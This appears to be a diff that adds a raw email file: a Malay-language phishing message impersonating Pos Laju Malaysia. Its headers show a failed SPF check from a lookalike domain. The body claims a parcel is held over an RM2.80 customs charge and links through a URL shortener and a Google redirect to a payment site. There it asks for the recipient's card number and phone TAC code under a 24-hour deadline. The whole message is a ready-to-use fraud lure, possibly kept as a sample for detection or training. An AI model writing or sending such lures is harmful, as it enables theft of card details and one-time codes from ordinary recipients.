@@ -1,0 +1,52 @@
+Return-Path: <bounce@poslaju-tracking.support>
+Received: from mx.unifi-mail.example (mx.unifi-mail.example [10.20.0.5])
+	by inbox.unifi-mail.example with LMTP; Mon, 23 Nov 2026 19:41:30 +0800
+Authentication-Results: mx.unifi-mail.example;
+	spf=fail (domain of bounce@poslaju-tracking.support does not designate 203.0.113.77 as permitted sender) smtp.mailfrom=poslaju-tracking.support;
+	dkim=none (message not signed);
+	dmarc=none header.from=poslaju-tracking.support
+Received: from ip-77.vps.example (unknown [203.0.113.77])
+	by mx.unifi-mail.example (Postfix) with ESMTP id 9C8D7E6
+	for <aina.rahman@unifi-mail.example>; Mon, 23 Nov 2026 19:41:27 +0800
+From: "Pos Laju" <noreply@poslaju-tracking.support>
+To: aina.rahman@unifi-mail.example
+Subject: =?UTF-8?Q?Bungkusan_ER482915603MY_ditahan:_caj_kastam_RM2.80_belum_dibayar?=
+Date: Mon, 23 Nov 2026 19:41:20 +0800
+Message-ID: <a71f0c9e5d@poslaju-tracking.support>
+X-Mailer: PHPMailer 6.9.1 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="pos02"
+
+--pos02
+Content-Type: text/plain; charset=utf-8
+
+Pelanggan yang dihormati,
+
+Bungkusan anda ER482915603MY tidak dapat dihantar. Penghantaran gagal kerana caj kastam RM2.80 belum dibayar.
+
+Sila buat bayaran segera untuk penghantaran semula: https://s.id/PosLaju-ER4829
+
+Anda perlu memasukkan nombor kad dan kod TAC yang dihantar ke telefon anda untuk mengesahkan bayaran.
+Bungkusan yang tidak dituntut dalam masa 24 jam akan dipulangkan kepada pengirim.
+
+Pos Laju Malaysia
+
+--pos02
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:Arial,sans-serif">
+<p><img src="https://poslaju-tracking.support/assets/poslaju.png" alt="Pos Laju" width="140"></p>
+<p>Pelanggan yang dihormati,</p>
+<p>Bungkusan anda <b>ER482915603MY</b> tidak dapat dihantar. <b>Penghantaran gagal</b> kerana caj kastam <b>RM2.80</b> belum dibayar.</p>
+<table border="1" cellpadding="6" style="border-collapse:collapse">
+<tr><td>No. Penjejakan</td><td>ER482915603MY</td></tr>
+<tr><td>Status</td><td>Ditahan di Pusat Pemprosesan Kastam, Sepang</td></tr>
+<tr><td>Caj tertunggak</td><td>RM2.80</td></tr>
+</table>
+<p><a href="https://www.google.com/url?q=https://poslaju-redelivery.top/bayar?id=ER482915603MY">Bayar RM2.80 sekarang</a></p>
+<p>Anda perlu memasukkan nombor kad dan kod TAC yang dihantar ke telefon anda untuk mengesahkan bayaran.
+Bungkusan yang tidak dituntut dalam masa 24 jam akan dipulangkan kepada pengirim.</p>
+<p>Atau gunakan pautan pendek: <a href="https://s.id/PosLaju-ER4829">https://s.id/PosLaju-ER4829</a></p>
+<p>Pos Laju Malaysia</p>
+</body></html>
+--pos02--
